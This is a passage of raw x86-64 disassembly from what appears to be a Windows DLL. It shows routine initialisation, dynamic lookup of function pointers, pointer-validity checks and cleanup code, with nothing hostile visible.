   1800049be:	74 20                	je     0x1800049e0
   1800049c0:	48 8b 0f             	mov    (%rdi),%rcx
   1800049c3:	48 85 c9             	test   %rcx,%rcx
   1800049c6:	74 18                	je     0x1800049e0
   1800049c8:	48 85 db             	test   %rbx,%rbx
   1800049cb:	74 0b                	je     0x1800049d8
   1800049cd:	ff d3                	call   *%rbx
   1800049cf:	48 8b 1d 1a 5e 01 00 	mov    0x15e1a(%rip),%rbx        # 0x18001a7f0
   1800049d6:	eb 05                	jmp    0x1800049dd
   1800049d8:	e8 a3 0b 00 00       	call   0x180005580
   1800049dd:	4c 89 3f             	mov    %r15,(%rdi)
   1800049e0:	ff c6                	inc    %esi
   1800049e2:	48 83 c5 68          	add    $0x68,%rbp
   1800049e6:	41 3b b6 68 03 00 00 	cmp    0x368(%r14),%esi
   1800049ed:	7c c1                	jl     0x1800049b0
   1800049ef:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1800049f4:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800049f9:	49 8d be 70 03 00 00 	lea    0x370(%r14),%rdi
   180004a00:	48 85 ff             	test   %rdi,%rdi
   180004a03:	74 20                	je     0x180004a25
   180004a05:	48 8b 0f             	mov    (%rdi),%rcx
   180004a08:	48 85 c9             	test   %rcx,%rcx
   180004a0b:	74 18                	je     0x180004a25
   180004a0d:	48 85 db             	test   %rbx,%rbx
   180004a10:	74 0b                	je     0x180004a1d
   180004a12:	ff d3                	call   *%rbx
   180004a14:	48 8b 1d d5 5d 01 00 	mov    0x15dd5(%rip),%rbx        # 0x18001a7f0
   180004a1b:	eb 05                	jmp    0x180004a22
   180004a1d:	e8 5e 0b 00 00       	call   0x180005580
   180004a22:	4c 89 3f             	mov    %r15,(%rdi)
   180004a25:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180004a2a:	49 81 c6 60 03 00 00 	add    $0x360,%r14
   180004a31:	74 24                	je     0x180004a57
   180004a33:	49 8b 0e             	mov    (%r14),%rcx
   180004a36:	48 85 c9             	test   %rcx,%rcx
   180004a39:	74 1c                	je     0x180004a57
   180004a3b:	48 85 db             	test   %rbx,%rbx
   180004a3e:	74 0f                	je     0x180004a4f
   180004a40:	ff d3                	call   *%rbx
   180004a42:	4d 89 3e             	mov    %r15,(%r14)
   180004a45:	48 83 c4 20          	add    $0x20,%rsp
   180004a49:	41 5f                	pop    %r15
   180004a4b:	41 5e                	pop    %r14
   180004a4d:	5b                   	pop    %rbx
   180004a4e:	c3                   	ret
   180004a4f:	e8 2c 0b 00 00       	call   0x180005580
   180004a54:	4d 89 3e             	mov    %r15,(%r14)
   180004a57:	48 83 c4 20          	add    $0x20,%rsp
   180004a5b:	41 5f                	pop    %r15
   180004a5d:	41 5e                	pop    %r14
   180004a5f:	5b                   	pop    %rbx
   180004a60:	c3                   	ret
   180004a61:	cc                   	int3
   180004a62:	cc                   	int3
   180004a63:	cc                   	int3
   180004a64:	cc                   	int3
   180004a65:	cc                   	int3
   180004a66:	cc                   	int3
   180004a67:	cc                   	int3
   180004a68:	cc                   	int3
   180004a69:	cc                   	int3
   180004a6a:	cc                   	int3
   180004a6b:	cc                   	int3
   180004a6c:	cc                   	int3
   180004a6d:	cc                   	int3
   180004a6e:	cc                   	int3
   180004a6f:	cc                   	int3
   180004a70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004a75:	48 63 81 68 03 00 00 	movslq 0x368(%rcx),%rax
   180004a7c:	85 c0                	test   %eax,%eax
   180004a7e:	7e 51                	jle    0x180004ad1
   180004a80:	4c 8b 81 60 03 00 00 	mov    0x360(%rcx),%r8
   180004a87:	4c 8b 99 70 03 00 00 	mov    0x370(%rcx),%r11
   180004a8e:	8b 9a 0c 01 00 00    	mov    0x10c(%rdx),%ebx
   180004a94:	45 33 c9             	xor    %r9d,%r9d
   180004a97:	4c 8b d0             	mov    %rax,%r10
   180004a9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004aa0:	49 63 40 60          	movslq 0x60(%r8),%rax
   180004aa4:	48 69 c0 24 06 00 00 	imul   $0x624,%rax,%rax
   180004aab:	42 39 9c 18 0c 01 00 	cmp    %ebx,0x10c(%rax,%r11,1)
   180004ab2:	00 
   180004ab3:	75 10                	jne    0x180004ac5
   180004ab5:	8b 8a 08 01 00 00    	mov    0x108(%rdx),%ecx
   180004abb:	42 39 8c 18 08 01 00 	cmp    %ecx,0x108(%rax,%r11,1)
   180004ac2:	00 
   180004ac3:	74 14                	je     0x180004ad9
   180004ac5:	49 ff c1             	inc    %r9
   180004ac8:	49 83 c0 68          	add    $0x68,%r8
   180004acc:	4d 3b ca             	cmp    %r10,%r9
   180004acf:	7c cf                	jl     0x180004aa0
   180004ad1:	33 c0                	xor    %eax,%eax
   180004ad3:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180004ad8:	c3                   	ret
   180004ad9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180004ade:	49 8b c0             	mov    %r8,%rax
   180004ae1:	c3                   	ret
   180004ae2:	cc                   	int3
   180004ae3:	cc                   	int3
   180004ae4:	cc                   	int3
   180004ae5:	cc                   	int3
   180004ae6:	cc                   	int3
   180004ae7:	cc                   	int3
   180004ae8:	cc                   	int3
   180004ae9:	cc                   	int3
   180004aea:	cc                   	int3
   180004aeb:	cc                   	int3
   180004aec:	cc                   	int3
   180004aed:	cc                   	int3
   180004aee:	cc                   	int3
   180004aef:	cc                   	int3
   180004af0:	40 53                	rex push %rbx
   180004af2:	48 83 ec 20          	sub    $0x20,%rsp
   180004af6:	48 8b d9             	mov    %rcx,%rbx
   180004af9:	48 8b 09             	mov    (%rcx),%rcx
   180004afc:	48 8d 15 75 c9 00 00 	lea    0xc975(%rip),%rdx        # 0x180011478
   180004b03:	ff 15 4f c5 00 00    	call   *0xc54f(%rip)        # 0x180011058
   180004b09:	48 8b 0b             	mov    (%rbx),%rcx
   180004b0c:	48 8d 15 85 c9 00 00 	lea    0xc985(%rip),%rdx        # 0x180011498
   180004b13:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180004b17:	ff 15 3b c5 00 00    	call   *0xc53b(%rip)        # 0x180011058
   180004b1d:	48 8b 0b             	mov    (%rbx),%rcx
   180004b20:	48 8d 15 91 c9 00 00 	lea    0xc991(%rip),%rdx        # 0x1800114b8
   180004b27:	48 89 43 18          	mov    %rax,0x18(%rbx)
   180004b2b:	ff 15 27 c5 00 00    	call   *0xc527(%rip)        # 0x180011058
   180004b31:	48 8b 0b             	mov    (%rbx),%rcx
   180004b34:	48 8d 15 a5 c9 00 00 	lea    0xc9a5(%rip),%rdx        # 0x1800114e0
   180004b3b:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180004b3f:	ff 15 13 c5 00 00    	call   *0xc513(%rip)        # 0x180011058
   180004b45:	48 8b 0b             	mov    (%rbx),%rcx
   180004b48:	48 8d 15 b1 c9 00 00 	lea    0xc9b1(%rip),%rdx        # 0x180011500
   180004b4f:	48 89 43 28          	mov    %rax,0x28(%rbx)
   180004b53:	ff 15 ff c4 00 00    	call   *0xc4ff(%rip)        # 0x180011058
   180004b59:	48 8b 0b             	mov    (%rbx),%rcx
   180004b5c:	48 8d 15 bd c9 00 00 	lea    0xc9bd(%rip),%rdx        # 0x180011520
   180004b63:	48 89 43 30          	mov    %rax,0x30(%rbx)
   180004b67:	ff 15 eb c4 00 00    	call   *0xc4eb(%rip)        # 0x180011058
   180004b6d:	48 8b 0b             	mov    (%rbx),%rcx
   180004b70:	48 8d 15 d1 c9 00 00 	lea    0xc9d1(%rip),%rdx        # 0x180011548
   180004b77:	48 89 43 38          	mov    %rax,0x38(%rbx)
   180004b7b:	ff 15 d7 c4 00 00    	call   *0xc4d7(%rip)        # 0x180011058
   180004b81:	48 8b 0b             	mov    (%rbx),%rcx
   180004b84:	48 8d 15 d5 c9 00 00 	lea    0xc9d5(%rip),%rdx        # 0x180011560
   180004b8b:	48 89 43 40          	mov    %rax,0x40(%rbx)
   180004b8f:	ff 15 c3 c4 00 00    	call   *0xc4c3(%rip)        # 0x180011058
   180004b95:	48 8b 0b             	mov    (%rbx),%rcx
   180004b98:	48 8d 15 e9 c9 00 00 	lea    0xc9e9(%rip),%rdx        # 0x180011588
   180004b9f:	48 89 43 48          	mov    %rax,0x48(%rbx)
   180004ba3:	ff 15 af c4 00 00    	call   *0xc4af(%rip)        # 0x180011058
   180004ba9:	48 8b 0b             	mov    (%rbx),%rcx
   180004bac:	48 8d 15 f5 c9 00 00 	lea    0xc9f5(%rip),%rdx        # 0x1800115a8
   180004bb3:	48 89 43 50          	mov    %rax,0x50(%rbx)
   180004bb7:	ff 15 9b c4 00 00    	call   *0xc49b(%rip)        # 0x180011058
   180004bbd:	48 8b 0b             	mov    (%rbx),%rcx
   180004bc0:	48 8d 15 09 ca 00 00 	lea    0xca09(%rip),%rdx        # 0x1800115d0
   180004bc7:	48 89 43 58          	mov    %rax,0x58(%rbx)
   180004bcb:	ff 15 87 c4 00 00    	call   *0xc487(%rip)        # 0x180011058
   180004bd1:	48 8b 0b             	mov    (%rbx),%rcx
   180004bd4:	48 8d 15 1d ca 00 00 	lea    0xca1d(%rip),%rdx        # 0x1800115f8
   180004bdb:	48 89 43 60          	mov    %rax,0x60(%rbx)
   180004bdf:	ff 15 73 c4 00 00    	call   *0xc473(%rip)        # 0x180011058
   180004be5:	48 8b 0b             	mov    (%rbx),%rcx
   180004be8:	48 8d 15 31 ca 00 00 	lea    0xca31(%rip),%rdx        # 0x180011620
   180004bef:	48 89 43 68          	mov    %rax,0x68(%rbx)
   180004bf3:	ff 15 5f c4 00 00    	call   *0xc45f(%rip)        # 0x180011058
   180004bf9:	48 8b 0b             	mov    (%rbx),%rcx
   180004bfc:	48 8d 15 3d ca 00 00 	lea    0xca3d(%rip),%rdx        # 0x180011640
   180004c03:	48 89 43 70          	mov    %rax,0x70(%rbx)
   180004c07:	ff 15 4b c4 00 00    	call   *0xc44b(%rip)        # 0x180011058
   180004c0d:	48 8b 0b             	mov    (%rbx),%rcx
   180004c10:	48 8d 15 49 ca 00 00 	lea    0xca49(%rip),%rdx        # 0x180011660
   180004c17:	48 89 43 78          	mov    %rax,0x78(%rbx)
   180004c1b:	ff 15 37 c4 00 00    	call   *0xc437(%rip)        # 0x180011058
   180004c21:	48 8b 0b             	mov    (%rbx),%rcx
   180004c24:	48 8d 15 5d ca 00 00 	lea    0xca5d(%rip),%rdx        # 0x180011688
   180004c2b:	48 89 83 80 00 00 00 	mov    %rax,0x80(%rbx)
   180004c32:	ff 15 20 c4 00 00    	call   *0xc420(%rip)        # 0x180011058
   180004c38:	48 8b 0b             	mov    (%rbx),%rcx
   180004c3b:	48 8d 15 66 ca 00 00 	lea    0xca66(%rip),%rdx        # 0x1800116a8
   180004c42:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   180004c49:	ff 15 09 c4 00 00    	call   *0xc409(%rip)        # 0x180011058
   180004c4f:	48 8b 0b             	mov    (%rbx),%rcx
   180004c52:	48 8d 15 6f ca 00 00 	lea    0xca6f(%rip),%rdx        # 0x1800116c8
   180004c59:	48 89 83 90 00 00 00 	mov    %rax,0x90(%rbx)
   180004c60:	ff 15 f2 c3 00 00    	call   *0xc3f2(%rip)        # 0x180011058
   180004c66:	48 8b 0b             	mov    (%rbx),%rcx
   180004c69:	48 8d 15 70 ca 00 00 	lea    0xca70(%rip),%rdx        # 0x1800116e0
   180004c70:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   180004c77:	ff 15 db c3 00 00    	call   *0xc3db(%rip)        # 0x180011058
   180004c7d:	48 8b 0b             	mov    (%rbx),%rcx
   180004c80:	48 8d 15 81 ca 00 00 	lea    0xca81(%rip),%rdx        # 0x180011708
   180004c87:	48 89 83 a0 00 00 00 	mov    %rax,0xa0(%rbx)
   180004c8e:	ff 15 c4 c3 00 00    	call   *0xc3c4(%rip)        # 0x180011058
   180004c94:	48 89 83 a8 00 00 00 	mov    %rax,0xa8(%rbx)
   180004c9b:	48 8b 0b             	mov    (%rbx),%rcx
   180004c9e:	48 8d 15 8b ca 00 00 	lea    0xca8b(%rip),%rdx        # 0x180011730
   180004ca5:	ff 15 ad c3 00 00    	call   *0xc3ad(%rip)        # 0x180011058
   180004cab:	48 8b 0b             	mov    (%rbx),%rcx
   180004cae:	48 8d 15 9b ca 00 00 	lea    0xca9b(%rip),%rdx        # 0x180011750
   180004cb5:	48 89 83 b0 00 00 00 	mov    %rax,0xb0(%rbx)
   180004cbc:	ff 15 96 c3 00 00    	call   *0xc396(%rip)        # 0x180011058
   180004cc2:	48 83 7b 10 00       	cmpq   $0x0,0x10(%rbx)
   180004cc7:	48 89 83 b8 00 00 00 	mov    %rax,0xb8(%rbx)
   180004cce:	74 53                	je     0x180004d23
   180004cd0:	48 83 7b 18 00       	cmpq   $0x0,0x18(%rbx)
   180004cd5:	74 4c                	je     0x180004d23
   180004cd7:	48 83 7b 70 00       	cmpq   $0x0,0x70(%rbx)
   180004cdc:	74 45                	je     0x180004d23
   180004cde:	48 83 7b 20 00       	cmpq   $0x0,0x20(%rbx)
   180004ce3:	74 3e                	je     0x180004d23
   180004ce5:	48 83 7b 28 00       	cmpq   $0x0,0x28(%rbx)
   180004cea:	74 37                	je     0x180004d23
   180004cec:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   180004cf1:	74 30                	je     0x180004d23
   180004cf3:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   180004cfa:	00 
   180004cfb:	74 26                	je     0x180004d23
   180004cfd:	48 83 bb 88 00 00 00 	cmpq   $0x0,0x88(%rbx)
   180004d04:	00 
   180004d05:	74 1c                	je     0x180004d23
   180004d07:	48 83 bb 90 00 00 00 	cmpq   $0x0,0x90(%rbx)
   180004d0e:	00 
   180004d0f:	74 12                	je     0x180004d23
   180004d11:	48 83 bb 98 00 00 00 	cmpq   $0x0,0x98(%rbx)
   180004d18:	00 
   180004d19:	74 08                	je     0x180004d23
   180004d1b:	33 c0                	xor    %eax,%eax
   180004d1d:	48 83 c4 20          	add    $0x20,%rsp
   180004d21:	5b                   	pop    %rbx
   180004d22:	c3                   	ret
   180004d23:	b8 05 00 00 00       	mov    $0x5,%eax
   180004d28:	48 83 c4 20          	add    $0x20,%rsp
   180004d2c:	5b                   	pop    %rbx
   180004d2d:	c3                   	ret
   180004d2e:	cc                   	int3
   180004d2f:	cc                   	int3
   180004d30:	40 53                	rex push %rbx
   180004d32:	48 83 ec 20          	sub    $0x20,%rsp
   180004d36:	83 b9 68 03 00 00 00 	cmpl   $0x0,0x368(%rcx)
   180004d3d:	48 8b d9             	mov    %rcx,%rbx
   180004d40:	7e 77                	jle    0x180004db9
   180004d42:	48 8b 81 60 03 00 00 	mov    0x360(%rcx),%rax
   180004d49:	81 78 10 02 10 00 00 	cmpl   $0x1002,0x10(%rax)
   180004d50:	75 67                	jne    0x180004db9
   180004d52:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180004d55:	89 91 c4 00 00 00    	mov    %edx,0xc4(%rcx)
   180004d5b:	83 f8 01             	cmp    $0x1,%eax
   180004d5e:	77 59                	ja     0x180004db9
   180004d60:	48 8d 15 d1 c6 00 00 	lea    0xc6d1(%rip),%rdx        # 0x180011438
   180004d67:	48 8d 0d da c6 00 00 	lea    0xc6da(%rip),%rcx        # 0x180011448
   180004d6e:	e8 2d d5 ff ff       	call   0x1800022a0
   180004d73:	48 89 83 c8 00 00 00 	mov    %rax,0xc8(%rbx)
   180004d7a:	48 85 c0             	test   %rax,%rax
   180004d7d:	74 3a                	je     0x180004db9
   180004d7f:	48 8d 15 d2 c6 00 00 	lea    0xc6d2(%rip),%rdx        # 0x180011458
   180004d86:	48 8b c8             	mov    %rax,%rcx
   180004d89:	ff 15 c9 c2 00 00    	call   *0xc2c9(%rip)        # 0x180011058
   180004d8f:	48 85 c0             	test   %rax,%rax
   180004d92:	74 25                	je     0x180004db9
   180004d94:	8b 8b c4 00 00 00    	mov    0xc4(%rbx),%ecx
   180004d9a:	83 f9 02             	cmp    $0x2,%ecx
   180004d9d:	75 08                	jne    0x180004da7
   180004d9f:	48 83 c4 20          	add    $0x20,%rsp
   180004da3:	5b                   	pop    %rbx
   180004da4:	48 ff e0             	rex.W jmp *%rax
   180004da7:	83 f9 01             	cmp    $0x1,%ecx
   180004daa:	75 0d                	jne    0x180004db9
   180004dac:	b9 03 00 00 00       	mov    $0x3,%ecx
   180004db1:	48 83 c4 20          	add    $0x20,%rsp
   180004db5:	5b                   	pop    %rbx
   180004db6:	48 ff e0             	rex.W jmp *%rax
   180004db9:	48 83 c4 20          	add    $0x20,%rsp
   180004dbd:	5b                   	pop    %rbx
   180004dbe:	c3                   	ret
   180004dbf:	cc                   	int3
   180004dc0:	40 53                	rex push %rbx
   180004dc2:	48 83 ec 20          	sub    $0x20,%rsp
   180004dc6:	48 8b d9             	mov    %rcx,%rbx
   180004dc9:	48 85 c9             	test   %rcx,%rcx
   180004dcc:	75 09                	jne    0x180004dd7
   180004dce:	8d 41 02             	lea    0x2(%rcx),%eax
   180004dd1:	48 83 c4 20          	add    $0x20,%rsp
   180004dd5:	5b                   	pop    %rbx
   180004dd6:	c3                   	ret
   180004dd7:	48 8b 89 c8 00 00 00 	mov    0xc8(%rcx),%rcx
   180004dde:	48 85 c9             	test   %rcx,%rcx
   180004de1:	74 11                	je     0x180004df4
   180004de3:	ff 15 77 c2 00 00    	call   *0xc277(%rip)        # 0x180011060
   180004de9:	48 c7 83 c8 00 00 00 	movq   $0x0,0xc8(%rbx)
   180004df0:	00 00 00 00 
   180004df4:	48 8b cb             	mov    %rbx,%rcx
   180004df7:	e8 74 fb ff ff       	call   0x180004970
   180004dfc:	48 8b 43 18          	mov    0x18(%rbx),%rax
   180004e00:	48 85 c0             	test   %rax,%rax
   180004e03:	74 13                	je     0x180004e18
   180004e05:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180004e09:	48 85 c9             	test   %rcx,%rcx
   180004e0c:	74 0a                	je     0x180004e18
   180004e0e:	ff d0                	call   *%rax
   180004e10:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   180004e17:	00 
   180004e18:	48 8b 0b             	mov    (%rbx),%rcx
   180004e1b:	48 85 c9             	test   %rcx,%rcx
   180004e1e:	74 0d                	je     0x180004e2d
   180004e20:	ff 15 3a c2 00 00    	call   *0xc23a(%rip)        # 0x180011060
   180004e26:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   180004e2d:	48 8b 05 bc 59 01 00 	mov    0x159bc(%rip),%rax        # 0x18001a7f0
   180004e34:	48 8b cb             	mov    %rbx,%rcx
   180004e37:	48 85 c0             	test   %rax,%rax
   180004e3a:	74 0a                	je     0x180004e46
   180004e3c:	ff d0                	call   *%rax
   180004e3e:	33 c0                	xor    %eax,%eax
   180004e40:	48 83 c4 20          	add    $0x20,%rsp
   180004e44:	5b                   	pop    %rbx
   180004e45:	c3                   	ret
   180004e46:	e8 35 07 00 00       	call   0x180005580
   180004e4b:	33 c0                	xor    %eax,%eax
   180004e4d:	48 83 c4 20          	add    $0x20,%rsp
   180004e51:	5b                   	pop    %rbx
   180004e52:	c3                   	ret
   180004e53:	cc                   	int3
   180004e54:	cc                   	int3
   180004e55:	cc                   	int3
   180004e56:	cc                   	int3
   180004e57:	cc                   	int3
   180004e58:	cc                   	int3
   180004e59:	cc                   	int3
   180004e5a:	cc                   	int3
   180004e5b:	cc                   	int3
   180004e5c:	cc                   	int3
   180004e5d:	cc                   	int3
   180004e5e:	cc                   	int3
   180004e5f:	cc                   	int3
   180004e60:	48 85 c9             	test   %rcx,%rcx
   180004e63:	74 17                	je     0x180004e7c
   180004e65:	48 85 d2             	test   %rdx,%rdx
   180004e68:	74 12                	je     0x180004e7c
   180004e6a:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   180004e6f:	74 0b                	je     0x180004e7c
   180004e71:	8b 81 c0 00 00 00    	mov    0xc0(%rcx),%eax
   180004e77:	89 02                	mov    %eax,(%rdx)
   180004e79:	33 c0                	xor    %eax,%eax
   180004e7b:	c3                   	ret
   180004e7c:	b8 02 00 00 00       	mov    $0x2,%eax
   180004e81:	c3                   	ret
   180004e82:	cc                   	int3
   180004e83:	cc                   	int3
   180004e84:	cc                   	int3
   180004e85:	cc                   	int3
   180004e86:	cc                   	int3
   180004e87:	cc                   	int3
   180004e88:	cc                   	int3
   180004e89:	cc                   	int3
   180004e8a:	cc                   	int3
   180004e8b:	cc                   	int3
   180004e8c:	cc                   	int3
   180004e8d:	cc                   	int3
   180004e8e:	cc                   	int3
   180004e8f:	cc                   	int3
   180004e90:	40 57                	rex push %rdi
   180004e92:	41 56                	push   %r14
   180004e94:	41 57                	push   %r15
   180004e96:	48 81 ec f0 01 00 00 	sub    $0x1f0,%rsp
   180004e9d:	48 8b 05 5c 41 01 00 	mov    0x1415c(%rip),%rax        # 0x180019000
   180004ea4:	48 33 c4             	xor    %rsp,%rax
   180004ea7:	48 89 84 24 d0 01 00 	mov    %rax,0x1d0(%rsp)
   180004eae:	00 
   180004eaf:	4d 8b f0             	mov    %r8,%r14
   180004eb2:	4c 8b fa             	mov    %rdx,%r15
   180004eb5:	48 8b f9             	mov    %rcx,%rdi
   180004eb8:	48 85 c9             	test   %rcx,%rcx
   180004ebb:	75 08                	jne    0x180004ec5
   180004ebd:	8d 41 02             	lea    0x2(%rcx),%eax
   180004ec0:	e9 ab 02 00 00       	jmp    0x180005170
   180004ec5:	48 89 9c 24 e8 01 00 	mov    %rbx,0x1e8(%rsp)
   180004ecc:	00 
   180004ecd:	48 85 d2             	test   %rdx,%rdx
   180004ed0:	74 21                	je     0x180004ef3
   180004ed2:	48 8b 02             	mov    (%rdx),%rax
   180004ed5:	48 85 c0             	test   %rax,%rax
   180004ed8:	74 19                	je     0x180004ef3
   180004eda:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   180004ede:	48 85 c9             	test   %rcx,%rcx
   180004ee1:	74 10                	je     0x180004ef3
   180004ee3:	48 89 05 fe 58 01 00 	mov    %rax,0x158fe(%rip)        # 0x18001a7e8
   180004eea:	48 89 0d ff 58 01 00 	mov    %rcx,0x158ff(%rip)        # 0x18001a7f0
   180004ef1:	eb 07                	jmp    0x180004efa
   180004ef3:	48 8b 05 ee 58 01 00 	mov    0x158ee(%rip),%rax        # 0x18001a7e8
   180004efa:	48 85 c0             	test   %rax,%rax
   180004efd:	74 09                	je     0x180004f08
   180004eff:	b9 80 03 00 00       	mov    $0x380,%ecx
   180004f04:	ff d0                	call   *%rax
   180004f06:	eb 0a                	jmp    0x180004f12
   180004f08:	b9 80 03 00 00       	mov    $0x380,%ecx
   180004f0d:	e8 ae 06 00 00       	call   0x1800055c0
   180004f12:	48 8b d8             	mov    %rax,%rbx
   180004f15:	48 89 07             	mov    %rax,(%rdi)
   180004f18:	48 85 c0             	test   %rax,%rax
   180004f1b:	75 08                	jne    0x180004f25
   180004f1d:	8d 43 03             	lea    0x3(%rbx),%eax
   180004f20:	e9 43 02 00 00       	jmp    0x180005168
   180004f25:	33 d2                	xor    %edx,%edx
   180004f27:	41 b8 80 03 00 00    	mov    $0x380,%r8d
   180004f2d:	48 8b cb             	mov    %rbx,%rcx
   180004f30:	e8 2b 03 00 00       	call   0x180005260
   180004f35:	48 8d 15 34 c8 00 00 	lea    0xc834(%rip),%rdx        # 0x180011770
   180004f3c:	48 8d 0d 3d c8 00 00 	lea    0xc83d(%rip),%rcx        # 0x180011780
   180004f43:	e8 58 d3 ff ff       	call   0x1800022a0
   180004f48:	48 8b cb             	mov    %rbx,%rcx
   180004f4b:	48 89 03             	mov    %rax,(%rbx)
   180004f4e:	48 85 c0             	test   %rax,%rax
   180004f51:	75 2a                	jne    0x180004f7d
   180004f53:	48 89 07             	mov    %rax,(%rdi)
   180004f56:	48 8b 05 93 58 01 00 	mov    0x15893(%rip),%rax        # 0x18001a7f0
   180004f5d:	48 85 c0             	test   %rax,%rax
   180004f60:	74 0c                	je     0x180004f6e
   180004f62:	ff d0                	call   *%rax
   180004f64:	b8 04 00 00 00       	mov    $0x4,%eax
   180004f69:	e9 fa 01 00 00       	jmp    0x180005168
   180004f6e:	e8 0d 06 00 00       	call   0x180005580
   180004f73:	b8 04 00 00 00       	mov    $0x4,%eax
   180004f78:	e9 eb 01 00 00       	jmp    0x180005168
   180004f7d:	48 89 ac 24 e0 01 00 	mov    %rbp,0x1e0(%rsp)
   180004f84:	00 
   180004f85:	e8 66 fb ff ff       	call   0x180004af0
   180004f8a:	8b e8                	mov    %eax,%ebp
   180004f8c:	85 c0                	test   %eax,%eax
   180004f8e:	74 2b                	je     0x180004fbb
   180004f90:	48 8b 15 59 58 01 00 	mov    0x15859(%rip),%rdx        # 0x18001a7f0
   180004f97:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   180004f9e:	48 8b cb             	mov    %rbx,%rcx
   180004fa1:	48 85 d2             	test   %rdx,%rdx
   180004fa4:	74 09                	je     0x180004faf
   180004fa6:	ff d2                	call   *%rdx
   180004fa8:	8b c5                	mov    %ebp,%eax
   180004faa:	e9 b1 01 00 00       	jmp    0x180005160
   180004faf:	e8 cc 05 00 00       	call   0x180005580
   180004fb4:	8b c5                	mov    %ebp,%eax
   180004fb6:	e9 a5 01 00 00       	jmp    0x180005160
   180004fbb:	4c 8d 43 08          	lea    0x8(%rbx),%r8
   180004fbf:	48 8d 0d 3a f9 ff ff 	lea    -0x6c6(%rip),%rcx        # 0x180004900
   180004fc6:	ba 01 00 00 00       	mov    $0x1,%edx
   180004fcb:	ff 53 10             	call   *0x10(%rbx)
   180004fce:	85 c0                	test   %eax,%eax
   180004fd0:	74 31                	je     0x180005003
   180004fd2:	48 8b 05 17 58 01 00 	mov    0x15817(%rip),%rax        # 0x18001a7f0
   180004fd9:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   180004fe0:	48 8b cb             	mov    %rbx,%rcx
   180004fe3:	48 85 c0             	test   %rax,%rax
   180004fe6:	74 0c                	je     0x180004ff4
   180004fe8:	ff d0                	call   *%rax
   180004fea:	b8 07 00 00 00       	mov    $0x7,%eax
   180004fef:	e9 6c 01 00 00       	jmp    0x180005160
   180004ff4:	e8 87 05 00 00       	call   0x180005580
   180004ff9:	b8 07 00 00 00       	mov    $0x7,%eax
   180004ffe:	e9 5d 01 00 00       	jmp    0x180005160
   180005003:	48 8d 15 86 c7 00 00 	lea    0xc786(%rip),%rdx        # 0x180011790
   18000500a:	48 8d 0d 8f c7 00 00 	lea    0xc78f(%rip),%rcx        # 0x1800117a0
   180005011:	ff 15 29 c0 00 00    	call   *0xc029(%rip)        # 0x180011040
   180005017:	48 8b cb             	mov    %rbx,%rcx
   18000501a:	e8 71 f4 ff ff       	call   0x180004490
   18000501f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
